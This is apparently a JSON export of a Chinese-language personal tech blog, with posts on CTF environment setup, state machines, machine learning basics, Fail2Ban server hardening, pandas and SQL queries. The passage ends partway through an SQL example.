{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io/en","root":"/en/"},"pages":[{"title":"","date":"2025-12-20T17:04:06.180Z","updated":"2025-12-20T17:04:06.180Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/en/about/index.html","excerpt":"","text":"TUM数学系研究生在读，CTF萌新。 CTF队伍h4tum成员，主要负责Crypto方向。 I’m a Master’s student in Mathematics at TUM and new to CTF. Member of the CTF team h4tum, mainly focusing on Crypto challenges. 联系/Contact Email: archer.ren@tum.de"},{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/en/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/en/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/en/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2025-11-23T19:34:07.425Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/en/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"CTF网络安全竞赛 入门","slug":"CTF/General/CTF网络安全竞赛-入门","date":"2026-01-22T18:39:03.000Z","updated":"2026-01-22T19:09:09.359Z","comments":true,"path":"2026/01/22/CTF/General/CTF网络安全竞赛-入门/","permalink":"https://archer-baiyi.github.io/en/2026/01/22/CTF/General/CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%85%A5%E9%97%A8/","excerpt":"CTF入门","text":"环境配置可以直接用miniconda配置一个专门用于CTF的环境。 安装Miniconda下载： 123cd ~wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh 安装： 1bash Miniconda3-latest-Linux-x86_64.sh 初始化： 123~/miniconda3/bin/conda initsource ~/.bashrc 验证安装： 12conda --versionwhich conda 创建环境推荐用Python 3.11，和各种库的适配性更好一点。 12conda create -n ctf python=3.11 -yconda activate ctf 环境名就叫ctf。 创建环境时可能会遇到这样的问题： 123456789101112CondaToSNonInteractiveError: Terms of Service have not been accepted for the following channels. Please accept or remove them before proceeding: - https://repo.anaconda.com/pkgs/main - https://repo.anaconda.com/pkgs/rTo accept these channels&#x27; Terms of Service, run the following commands: conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/main conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/rFor information on safely removing channels from your conda configuration,please see the official documentation: https://www.anaconda.com/docs/tools/working-with-conda/channels 这个时候同意一下它的那些政策就好：运行 12conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/mainconda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/r 然后再创建环境。 安装常用包： 1234567891011sudo apt updatesudo apt install -y build-essential python3-dev \\ libgmp-dev libssl-dev libffi-dev python -m pip install -U pip setuptools wheelpython -m pip install \\ pwntools cryptography pycryptodome gmpy2 z3-solver \\ flask requests beautifulsoup4 \\ capstone keystone-engine unicorn ropper sympy 工具除此之外还有些常用的工具： 123456789sudo apt updatesudo apt install -y \\ build-essential gdb gdb-multiarch \\ binutils nasm \\ python3-dev \\ git curl wget \\ tmux unzip \\ radare2 \\ checksec","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/en/categories/CTF/General/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://archer-baiyi.github.io/en/tags/ctf/"}]},{"title":"摩尔型有限状态机建模","slug":"TUM info 笔记/ERA/摩尔型状态机建模","date":"2026-01-20T21:34:27.000Z","updated":"2026-02-03T22:19:53.705Z","comments":true,"path":"2026/01/20/TUM info 笔记/ERA/摩尔型状态机建模/","permalink":"https://archer-baiyi.github.io/en/2026/01/20/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/%E6%91%A9%E5%B0%94%E5%9E%8B%E7%8A%B6%E6%80%81%E6%9C%BA%E5%BB%BA%E6%A8%A1/","excerpt":"计算机体系结构基础相关笔记","text":"基础摩尔型状态机/自动机：输出只取决于 例子1（电梯） 输入分2种： E1, E2：指的是电梯上的按钮 End1, End2：指的是限位器之类的 输出则是： U=1：往上运行 D=1：往下运行 D=U=0：静止 最普通的想法可能就是建模2个状态，在一楼和在二楼。但在这种模型中，一般2个状态中间的转变是瞬间的。所以为了更贴合现实，我们最好设置4个状态： 在1楼，在2楼 上升，下降 当我们按了E2按钮后，电梯就会上升。当它触碰到了2楼的限位器，就会停止上升，停留在2楼。 而输出确实只是取决于当前的状态，输入最多算是切换了状态，但是没有直接影响输出。（输入改变了状态，状态决定了输出） One-Hot Kodierung想要构造对应的电路图，最简单直接的方法就是用位置来表示状态： 有多少个状态就设置多少个FF (Flip-Flop)。 Binär Kodierung而二进制编码则讲究用更少的 FF 来表示状态。如果有 $N$ 个状态，只需要 $q=\\lceil \\log_2 N\\rceil$ 个状态位（state bits）。比如说这个例子里就是2： 所以有： Mikroprogrammierte Steuerwerke（微程序控制器）Mikroprogrammierte Steuerwerke的核心想法是用存储器查表实现状态机，代替那些电路结构的推理以及实现。 用一个存储器实现状态转移函数（Zustandsübergangsfunktion durch einen Speicher） 地址（Adresse）由两部分拼出来： 当前状态 $Z$（q bit） 输入信号/状态变量 $X$（m bit） 存储器输出一条微指令（Mikroinstruktion），里面包含： 下一状态 $Z’$（q bit） 输出信号 $Y$（n bit） 把它想成一个“查表函数”： (Z', Y) = \\text{ROM}[\\, Z \\| X \\,]其中 $Z | X$ 表示把状态位和输入位拼接成地址。 状态寄存器（FFs）保存当前状态 $Z$，每个时钟沿更新一次 当前状态 $Z$ + 输入 $X$ → 作为 ROM 地址 ROM 输出一条“控制字/微指令”，分两部分： $Z’$：回写到状态寄存器，成为下一个周期的状态 $Y$：直接作为输出控制信号（例如电机上/下） 例子2（扶梯） 我们现在想建模这个扶梯，可以通过传感器控制往上或者往下。只不过在往上（下）的过程中： 如果往上（下）的传感器触发了，就会增加往上（下）的时间 往下（上）的传感器无法触发 状态机 图中状态里的tuple是(Stopp, Unten, Oben)，停止/往上/往下。而Übergang上的tuple表示的是(s1传感器,s2传感器)。 注意，因为是自动扶梯，所以不存在停留在几楼的问题，状态只有停止，往上和往下。所以把这个图画成三角形的样子会更直观一点： 微程序控制（Microprogrammed Control） A. Bedingung (条件选择码) 看电路图右下角的 MUX（多路选择器）。它决定了当前检查哪个传感器。 $s1$ 接在第 0 个位置 $\\to$ 代码 000 $s2$ 接在第 1 个位置 $\\to$ 代码 001 $1$ (常数/True) 接在第 2 个位置 $\\to$ 代码 010 (意思是“无条件跳转”) B. Steuersignale (控制信号) 这就是我们上一问里写的 Tuple (Stopp, Unten, Oben)。 停止 $\\to$ 1 0 0 向下 $\\to$ 0 1 0 向上 $\\to$ 0 0 1 C. 逻辑流 (Jump vs. Next) 电路图左边的逻辑是： 如果条件满足 (True)：跳转到 Folgeadresse (下一列填的地址)。 如果条件不满足 (False)：执行 Address + 1 (也就是单纯的下一行)。 我们把表格分成三块，分别对应状态机的三个圆圈。 第一块：初始/停止状态 (对应 Z0) 目标： 电机停。如果 $S1$ 亮去上，如果 $S2$ 亮去下，否则原地待命。 地址 0000: if (S1) goto oben Steuer: 1 0 0 (保持停止)。 Bedingung: 检查 $S1$ $\\to$ 填 0 0 0。 Folgeadresse: 填 0 0 1 1 (这是下面定义的 oben 入口地址)。 逻辑：S1 没触发就去下一行 0001。 地址 0001: if (S2) goto unten Steuer: 1 0 0 (保持停止)。 Bedingung: 检查 $S2$ $\\to$ 填 0 0 1。 Folgeadresse: 填 0 1 1 0 (这是下面定义的 unten 入口地址)。 地址 0010: goto init (回开头) Steuer: 1 0 0。 Bedingung: 总是跳 (常数1) $\\to$ 填 0 1 0。 Folgeadresse: 回到第一行 $\\to$ 填 0 0 0 0。 第二块：向上状态 (对应 Z1, 标签 oben) 目标： 电机上行。只要 $S1$ 在就死循环；$S1$ 没了看 $S2$；$S2$ 也没了就停。 地址0011: while (S1) (死循环维持) Steuer: 0 0 1 (开始输出 Oben=1)。 Bedingung: 检查 $S1$ $\\to$ 填 0 0 0。 Folgeadresse: 0 0 1 1 (跳回自己)。 逻辑：只要 S1 是 1，就不断跳回 0011，一直维持输出 Oben。一旦 S1 变成 0，条件不满足，自动掉落到下一行 0100。 地址0100: if (S2) goto unten (反转逻辑) Steuer: 0 0 1 (依然保持 Oben，因为还在这个逻辑块里)。 Bedingung: 检查 $S2$ $\\to$ 填 0 0 1。 Folgeadresse: 0 1 1 0 (去 Unten)。 地址0101: goto init (没人了，去停) Steuer: 0 0 1。 Bedingung: 无条件 $\\to$ 0 1 0。 Folgeadresse: 0 0 0 0 (回 Init)。 第三块：向下状态 (对应 Z2, 标签 unten) 地址 0110: while (S2) Steuer: 0 1 0 (输出 Unten=1)。 Bedingung: 检查 $S2$ $\\to$ 0 0 1。 Folgeadresse: 0 1 1 0 (跳回自己)。 地址 0111: if (S1) goto oben Steuer: 0 1 0。 Bedingung: 检查 $S1$ $\\to$ 0 0 0。 Folgeadresse: 0 0 1 1 (去 Oben)。 地址 1000: goto init Steuer: 0 1 0。 Bedingung: 无条件 $\\to$ 0 1 0。 Folgeadresse: 0 0 0 0。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[]},{"title":"机器学习 Machine Learning","slug":"TUM info 笔记/Machine Learning/机器学习-Machine-Learning","date":"2026-01-20T12:14:14.000Z","updated":"2026-02-22T13:11:32.451Z","comments":true,"path":"2026/01/20/TUM info 笔记/Machine Learning/机器学习-Machine-Learning/","permalink":"https://archer-baiyi.github.io/en/2026/01/20/TUM%20info%20%E7%AC%94%E8%AE%B0/Machine%20Learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-Machine-Learning/","excerpt":"机器学习相关笔记","text":"基础机器学习的本质就是我们通过一些已知数据训练出一个模型，然后用它来预测未知数据。 或者说，我们现在有一些数据 \\{ (x,y) \\}我们希望通过这些数据训练出一个函数： f : X \\to Y, \\ \\ f(x)=y我们一般会这样划分数据： 我们会先设置一些超参数，然后利用Training set来训练这些参数对应的模型，并用Validation set来测试这些对数对应模型的准确度，最后挑选一个表现最好的，去测试Test set。 Decision Tree 决策树来看一个例子： 很自然的，我们会想到，通过前面3列内容的结果来推导出他们最后是否会来打网球。那么我们就可以进行一个类似二分查找的计算： 而这个就是决策树。我们会通过一系列决策来判决（预测）最后的结果。 当然，我们也可以拓展到一般的多维空间： 在这种决策树的图中： 节点（Node）表示各种决策（feature test） 分支（Branch）表示决策结果 叶子节点（Leaf）表示一部分输入空间，以及这部分空间的样品分布 分类/预测而给一个新的点进行分类/预测也就很简单了： 假设一个新的点x通过这个决策树的各种决策最后落到了一个（代表区域$R$的）叶子节点上，而这个叶子节点的分布是$n_R = (n_{c_1,R},…, n_{c_k,R})$，而$C = \\{ c_1, …, c_k\\}$ 代表的是各种可能的label（分类）。那么我们只需要看当前这个区域哪种类的点最多，就可以给x也分到这个类。 数学一点的写法： 记 p(y=c | R) = \\frac{n_{c,R}}{\\sum_{c_i \\in C}n_{c_i,R}}那么我们就给x分类成/预测成 \\hat{y} = \\underset{c}{\\text{arg max}} p(y=c|x) = \\underset{c}{\\text{arg max}} p(y=c|R)=\\underset{c}{\\text{arg max}} n_{c,R}优化/生成我们可以通过定义不同的不纯度（Impurity measures）来判断是否要继续生成子树 （记$\\pi_c = p(y=c | t)$）： Misclassification rate Entropy（熵） Gini Index Misclassification rate当misclassification rate i_E(t) = 1- \\underset{t}{\\text{max}} \\ \\pi_c可以得到优化时我们才会继续细分（split）节点$t$。 而针对不同的细分（split）策略$s$（把$t$分成$t_R$和$t_L$）时，我们定义所谓的优化程度（improvement）： \\Delta i(s,t) = 1- (p_L \\cdot i(t_l) + p_R \\cdot i(t_R))其中$p_L$指的是$|t_L| / |t|$。 停止可以笼统地概括成2种： Pre-prunning Post-prunning Pre-prunning 预剪枝就是生成的过程中判断是否停止，常见的判断条件： 节点纯：$i(t)=0$ 达到最大深度 分支样本数太少（阈值 $t_n$） 分裂收益太小：$\\Delta i(s,t) &lt; t_\\Delta$ 验证集准确率不再提升 Post-prunning 后剪枝先生成一个全面复杂的树，然后再修剪它：尝试把其中一颗子树替换成一片叶子节点（删掉 $t$ 的所有子孙，只保留 $t$（得到 $T\\setminus T_t$）），然后验证错误率是否有变化。最后选择让验证误差下降最多的剪枝点。 K-Nearest Neighbours（KNN） K-近邻KNN的核心思路其实很简单：物以类聚，人以群分。 就是假设我们有一个未知label的点x，我们查看离它最近的几个点都是什么label，如果最近的几个点都是A，那么我们也给x判定成A。 1-NN 定义一个距离的测度 计算找出离x点最近的点 这个点是什么label我们就给x划分成是什么label k-NN普通的： 设$\\mathcal{N}_k(x)$为向量 $x$ 的 $k$ 个最近邻的集合，那么在分类任务中： p(y=c \\mid x, k) = \\sum_{i \\in \\mathcal{N}_k(x)} \\mathbb{1}(y_i = c), \\hat{y} = \\underset{c}{\\arg \\max} \\, p(y = c \\mid x, k)权重版： 设$\\mathcal{N}_k(x)$为向量 $x$ 的 $k$ 个最近邻的集合，那么在分类任务中： p(y=c \\mid x, k) = \\frac{1}{Z} \\sum_{i \\in \\mathcal{N}_k(x)} \\frac{1}{d(x, x_i)} \\mathbb{1}(y_i = c), \\hat{y} = \\underset{c}{\\arg \\max} \\, p(y = c \\mid x, k)其中 $Z = \\sum_{i \\in \\mathcal{N}_k(x)} \\frac{1}{d(x, x_i)}$ 是归一化常数，$d(x, x_i)$ 是 $x$ 和 $x_i$ 之间的距离度量。但常数系数对求arg max没有影响，可以忽略。 注意到，每个近邻的权重$\\frac{1}{d(x, x_i)}$是不一样的，距离越近的权重越高。 线性回归： 设$\\mathcal{N}_k(x)$为向量 $x$ 的 $k$ 个最近邻的集合，那么： \\hat{y} = \\frac{1}{Z} \\sum_{i \\in \\mathcal{N}_k(x)} \\frac{1}{d(x, x_i)} y_i其中 $Z = \\sum_{i \\in \\mathcal{N}_k(x)} \\frac{1}{d(x, x_i)}$ 是归一化常数，$d(x, x_i)$ 是 $x$ 和 $x_i$ 之间的距离度量。 如何选择kk这种参数被称作超参数，是事先给定的，用来控制学习过程的参数。 超参数调优过程 (Hyper-parameter tuning procedure)： 使用 训练集 训练模型（在 KNN 中即存储数据）。 在 验证集 上评估不同 $k$ 值的性能，并挑选出最好的 $k$。 在 测试集 上报告最终的性能。 但是当维度升上去了，knn会变得及其复杂，需要大量的内存。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"机器学习 Machine Learning","slug":"TUM-info-课程笔记/机器学习-Machine-Learning","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-Machine-Learning/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://archer-baiyi.github.io/en/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://archer-baiyi.github.io/en/tags/Machine-Learning/"}]},{"title":"配置服务器","slug":"CTF/服务器/配置服务器","date":"2026-01-11T12:29:42.000Z","updated":"2026-01-12T17:03:24.389Z","comments":true,"path":"2026/01/11/CTF/服务器/配置服务器/","permalink":"https://archer-baiyi.github.io/en/2026/01/11/CTF/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"服务器初始化安全加固Fail2BanFail2Ban 通过实时监控系统日志，自动识别并在防火墙中封禁那些在短时间内多次认证失败的恶意IP，从而阻断暴力破解攻击。 比如说如果IP 1.2.3.4 在5分钟内输错3次密码，则封禁该IP 24小时。 安装： 12sudo apt updatesudo apt install fail2ban -y 启动并设置开机自启： 12345# 1. 允许服务开机自启sudo systemctl enable fail2ban# 2. 现在立刻启动服务sudo systemctl start fail2ban 查看状态： 1sudo systemctl status fail2ban 正常开启的情况应该会看到这样的内容： JailFail2Ban 的 Jail（监狱） 是一个独立的防御策略单元。它将“日志监控规则”与“防火墙执行动作”绑定，用于保护特定的服务。 从技术实现角度，一个 Jail 包含以下三个核心闭环流程： 日志轮询 (Log Polling)： Jail 持续读取并分析指定的系统日志文件（Backend，例如 /var/log/auth.log）。 正则匹配与计数 (Filter &amp; Counter)： 使用预设的 Python 正则表达式 (Regex) 实时匹配日志中的失败记录。Jail 会在内存中维护一个滑动时间窗口 (findtime)，统计同一源 IP 的匹配次数。 动作执行 (Action Execution)： 一旦计数达到设定的阈值 (maxretry)，Jail 会立即调用系统层面的命令（通常是修改 iptables 或 nftables 防火墙规则），在网络层直接拒绝该 IP 的连接请求，并持续 bantime 设定的时长。 查看Jail情况： 1sudo fail2ban-client status 如果显示： 123Status|- Number of jail: 0`- Jail list: 则代表没有监控任何东西。 开启ssh监控： 1printf &quot;[sshd]\\nenabled = true\\n&quot; | sudo tee /etc/fail2ban/jail.local 然后重启服务让它生效： 1sudo systemctl restart fail2ban 这时候再检查就应该看到： 1234sudo fail2ban-client statusStatus|- Number of jail: 1`- Jail list: sshd 常用python库安装这种库是直接安装在系统自带的python3的下面，所以直接用python3来运行脚本即可。不依赖创建虚拟环境，会方便很多，但是版本可能比较老。 1234567891011121314151617sudo apt install python3-pwntoolssudo apt install python3-requestssudo apt install python3-numpysudo apt install python3-pillowsudo apt install python3-elftoolssudo apt install python3-cryptographysudo apt install python3-gmpy2sudo apt install python3-pycryptodomesudo apt install python3-z3","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"服务器","slug":"CTF/服务器","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"server","slug":"server","permalink":"https://archer-baiyi.github.io/en/tags/server/"}]},{"title":"Python的Pandas库","slug":"编程/Python的Pandas库","date":"2025-12-22T16:51:27.000Z","updated":"2025-12-22T16:59:16.344Z","comments":true,"path":"2025/12/22/编程/Python的Pandas库/","permalink":"https://archer-baiyi.github.io/en/2025/12/22/%E7%BC%96%E7%A8%8B/Python%E7%9A%84Pandas%E5%BA%93/","excerpt":"","text":"什么是Pandas库？Pandas 是 Python 生态中用于数据处理与分析的核心库，提供以 Series（带索引的一维数组） 与 DataFrame（带行列标签、可混合类型的二维表） 为基础的数据结构，支持对结构化数据（如 CSV、Excel、数据库导出表等）进行高效、可复现的操作。其主要功能可概括如下： 数据读取与写入：支持从 CSV、Excel、JSON、HTML 表格、剪贴板以及多种数据库接口读取数据，并可将处理结果便捷地导出为常见文件格式，便于与其他系统或工具对接。 数据清洗与预处理：提供缺失值处理、重复值处理、类型转换、字符串处理、日期时间解析、异常值筛查等能力，帮助将原始数据整理为可分析的标准化数据集。 数据选择与过滤：支持按列、按行、按条件或按标签/位置进行灵活索引与切片，并可进行排序、抽样与去重操作，满足数据探索与业务规则过滤的需求。 统计分析与汇总计算：内置丰富的描述性统计与聚合函数，可快速计算均值、方差、分位数、相关性等指标，并支持按组（groupby）进行分组统计与多指标汇总。 数据变形与重构：提供透视表（pivot_table）、交叉表（crosstab）、宽表/长表转换（melt）、合并与连接（merge/join/concat）等功能，便于在不同分析视角下重组数据结构。 时间序列处理：对时间索引与时间窗口操作提供原生支持，可完成按频率重采样（resample）、移动窗口计算（rolling）、时间对齐与区间筛选等任务，适用于金融、物联网、日志等场景。 与可视化及科学计算生态协同：Pandas 可与 NumPy、Matplotlib、SciPy、scikit-learn 等库无缝集成，既可作为数据处理管道的基础，也可作为建模与可视化的上游数据准备工具。 总体而言，Pandas 以“表格化数据”为中心，覆盖从数据导入、清洗、变换到统计汇总的关键流程，是进行数据分析与数据工程原型开发的常用基础组件。 安装/导入1pip install pandas 1import pandas as pd","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"pandas","slug":"pandas","permalink":"https://archer-baiyi.github.io/en/tags/pandas/"}]},{"title":"SQL入门","slug":"编程/SQL入门","date":"2025-12-07T21:53:03.000Z","updated":"2026-02-19T12:35:41.603Z","comments":true,"path":"2025/12/07/编程/SQL入门/","permalink":"https://archer-baiyi.github.io/en/2025/12/07/%E7%BC%96%E7%A8%8B/SQL%E5%85%A5%E9%97%A8/","excerpt":"","text":"什么是SQL？SQL（Structured Query Language，结构化查询语言）是一种用于定义、查询和管理关系型数据库的一种声明式语言。 声明式语言指的是：只需要描述想要什么结果（例如要哪些数据、满足什么条件），而不必编写具体怎么一步步实现的过程。具体的执行方式由数据库的查询优化器与执行引擎决定。 它主要用来做这些事： 查询数据（DQL）：比如 SELECT，从表里查数据、过滤、排序、分组等 定义数据库结构（DDL）：比如 CREATE / ALTER / DROP，创建/修改/删除表、索引、视图等 操作数据（DML）：比如 INSERT / UPDATE / DELETE，新增、修改、删除表中的记录 权限控制（DCL）：比如 GRANT / REVOKE，给用户授权或收回权限 事务控制（TCL）：比如 COMMIT / ROLLBACK / SAVEPOINT，控制事务提交、回滚等 基础一般的SQL查询语句的语法顺序/结构如下： 1234567SELECT [DISTINCT] &lt;select_list&gt;FROM &lt;table_or_subquery&gt; [JOIN ... ON ...]WHERE &lt;row_conditions&gt;GROUP BY &lt;group_cols&gt;HAVING &lt;group_conditions&gt;ORDER BY &lt;sort_exprs&gt;LIMIT &lt;n&gt; [OFFSET &lt;m&gt;]; SELECT：选择列 DISTINCT：去重 FROM：选择表格 WHERE：筛选条件 GROUP BY：分组 HAVING：对分组后的结果过滤 ORDER BY：排序 ASC：升序 DESC：降序 LIMIT：截断返回行数 而它们的执行顺序是：FROM → WHERE → GROUP BY → HAVING → SELECT → DISTINCT → ORDER BY → LIMIT 入门以这个数据库为例（ https://hyper-db.de/interface.html ） 如果我们想知道一共有哪些教授，那么我们只需要： 列出Professors这张表里的 Name这一列的所有内容 对应的命令： SELECT后跟列名 FROM后跟表名 12SELECT NameFROM Professors DISTINCT假如我们只关注Professors表里一共有多少种不同的Level： 如果用之前的方法它会重复输出： 12SELECT LevelFROM Professors 所以我们需要用DISTINCT来去重： 12SELECT DISTINCT LevelFROM Professors ORDER BY在结果较多时我们往往希望将结果排序以便我们后续操作，这是需要用到ORDER BY： ASC：升序 DESC：降序 默认是升序（ASC）。 123SELECT Name, LevelFROM ProfessorsORDER BY Level ASC; LIMIT也可以只查看前几条结果： 123SELECT NameFROM ProfessorsLIMIT 3 OFFSET和LIMIT类似，只不过是查看从第几条开始之后的结果。 配合LIMIT一起用可以直接锁定某个排名的人： 12345SELECT Name, SemesterFROM studentsORDER BY Semester DESCOFFSET 0LIMIT 1 注意，offset是从0开始的。 WHERE如果现在想要加上一点条件，比如说只显示Level等于C4的教授，那么就是： WHERE后面跟筛选条件 123SELECT NameFROM ProfessorsWHERE Level = &#x27;C4&#x27; 命名有时我们希望自己命名查询结果的列名，这时候就需要AS： 12SELECT Name AS Prof_nameFROM Professors 除此之外，有些时候筛选会遇到2个表里有相同的列名，这个时候就需要命名每个表以此来区分： 在每个表后加上空格以及新的名字（例如Students s） 在之后的部分就可以用s指代这张表 比如说我们想知道学生”Fichte”上了哪些课： 1234SELECT s.Name, a.LectureNrFROM Students s, attend aWHERE s.StudNr = a.StudNr AND s.Name = &#x27;Fichte&#x27; COUNT如果我们想知道一共有多少名教授，就需要COUNT来帮助我们数数：12SELECT COUNT(*)FROM Professors GROUP BY如果我们想知道每个Level各有多少教授，就需要GROUP BY来帮助我们进行分组： 123SELECT Level, COUNT(*)FROM ProfessorsGROUP BY Level; 在 GROUP BY 查询里，SELECT 里出现的每个表达式必须满足二选一： 是分组键（出现在 GROUP BY 里，或能由分组键唯一决定），或者 是聚合表达式（被 SUM/AVG/COUNT/MIN/MAX/... 包起来） 否则： 但是通过GROUP BY a, b, c这种只会得到最细粒度的分组，即每个(a,b,c)一行。 那我们同时还想得到更粗颗粒度的分组结果（比如按照(a,b),(a),(a,c)这些分组）该怎么办呢？ 最普通的方法就是用UNION ALL：12345678910111213141516171819SELECT a, NULL AS b, c, COUNT(*) AS cntFROM tGROUP BY a, cUNION ALLSELECT NULL AS a, b, c, COUNT(*) AS cntFROM tGROUP BY b, cUNION ALLSELECT a, NULL AS b, NULL AS c, COUNT(*) AS cntFROM tGROUP BY a 当然，还有很多更加便捷的方法： GROUPING SETS可以用GROUPING SETS来定义多个想要的分组： 12345678GROUP BY GROUPING SETS ( (a, b, c), (a, c), (b, c), (a), (c), (),) 其中 () 是全表总计（grand total），只按“空分组”汇总一次。 CUBE1GROUP BY CUBE(a,b,c) CUBE会处理所有子集分组。即当维度（CUBE括号里的列个数）为n时，会产生$2^n$种分组。 例如n=3时，一共8种： (a,b,c) (a,b) (a,c) (b,c) (a) (b) (c) () 全表总计 CUBE的输出里某些维度列会出现NULL，它代表这一行在该维度上“被汇总掉了”（对所有该维度值求和/求平均等）。比如说在按照(a,b)分组的部分内容里，那么c栏内容就会是NULL。 因为CUBE会显示/返回所有分组层级的结果，所以通常要用WHERE ... IS NULL来挑某一层。 例子：只要按(a,b)的汇总，即c IS NULL： 123SELECT a, b, sFROM cube_tableWHERE c IS NULL; ROLLUP与CUBE不同，ROLLUP会沿着维度列表“逐层向上汇总。 1GROUP BY ROLLUP(a,b,c) 例如n=3的情况，ROLLUP会计算这几个分组： (a,b,c) (a,b) (a) () 不会处理(a,c)之类的分组结果。 HAVING在分组的基础上我们往往希望再加点筛选条件，这个时候就需要HAVING来对分组后的结果过滤。 比如说我们想知道哪些Level的人数超过了3： 1234SELECT Level, COUNT(*)FROM ProfessorsGROUP BY LevelHAVING COUNT(*) &gt; 3; 子查询/嵌套假如我们想知道哪些学生的学期数在平均学期数以下，就需要拆成2步来完成 计算平均学期数（先生成一个子列表） 12SELECT AVG(Semester)FROM Students 筛选 123SELECT NameFROM StudentsWHERE Semester &lt; 拼起来就是： 1234SELECT NameFROM StudentsWHERE Semester &lt; (SELECT AVG(Semester) FROM Students) 或者也可以： 1234SELECT NameFROM Students, (SELECT AVG(Semester) AS avg_semester FROM Students) avgWHERE Semester &lt; avg_semester 这样会高效很多。 LATERALLATERAL允许FROM子句中的派生表/子查询/表函数引用其左侧 FROM 项的列，从而形成相关（correlated）的行源，并对左侧输入的每一行进行求值。 例子： 123SELECT * FROM(SELECT 1 AS x) AS t1,LATERAL (SELECT t1.x+1 AS y) AS t2 这段等价于： 123for x in [1]: for y in [x+1]: print(x,y) 集合比较与存在性IN判断是否属于集合。 比如说我们想知道哪些学生参加了5001这门课，并且最后输出它们的名字，那么我们就可以用IN来进行判断： 1234567SELECT s.NameFROM Students sWHERE s.StudNr IN ( SELECT a.StudNr FROM attend a WHERE a.LectureNr = 5001); ANY对集合里至少一个成立。 比如说我们想找出房间号比某个 C3 教授房间更大的教授： 1234567SELECT p.Name, p.RoomFROM Professors pWHERE p.Room &gt; ANY ( SELECT Room FROM Professors WHERE Level = &#x27;C3&#x27;); ALL比如说我们想找出房间号比所有 C3 教授房间都小的教授和房间： 1234567SELECT p.Name, p.RoomFROM Professors pWHERE p.Room &lt; ALL ( SELECT Room FROM Professors WHERE Level = &#x27;C3&#x27;); EXISTS比如说我们想找出至少开了一门课的教授： 1234567SELECT p.NameFROM Professors pWHERE EXISTS ( SELECT 1 FROM Lectures l WHERE l.Given_by = p.PersNr); NOT EXISTS找出没有学生选的课程： 1234567SELECT l.LectureNr, l.TitleFROM Lectures lWHERE NOT EXISTS ( SELECT 1 FROM attend a WHERE a.LectureNr = l.LectureNr); Common Table Expression (CTE) / WITH ASCTE的核心动机： 可读性/结构化 多层嵌套查询堆起来很难读 CTE 可以“给每一步命名”，让外层查询更清爽 可复用 CTE 的结果可以在同一个查询里被引用多次（比重复写子查询好） CTE具体用到的命令就是WITH AS。 WITH AS的功能是在一条 SQL 里给一段子查询/临时结果起名字，后面就能像用表一样用它。 注意，WITH AS和子查询是等价的，但是用WITH AS会更容易阅读和理解。 基本语法： 12345WITH 名字(可选列名列表) AS ( 一条查询)SELECT ...FROM 名字; 一条SQL也可以写多个 CTE，用逗号隔开： 123WITH cte1 AS (...), cte2 AS (...)SELECT ... 例子：查询C4教授的房间（先找C4教授，再查询他们的房间） 1234567WITH C4Prof AS ( SELECT * FROM Professors WHERE Level = &#x27;C4&#x27;)SELECT Name, RoomFROM C4Prof; 也可以用VALUES临时造数据： 12345678910111213WITH Professors ( persnr , name , paygrade , room , salary , taxclass ) as(VALUES (2125 , &#x27; Sokrates &#x27; , &#x27; C4 &#x27; ,226 ,85000 ,1) , (2126 , &#x27; Russel &#x27; 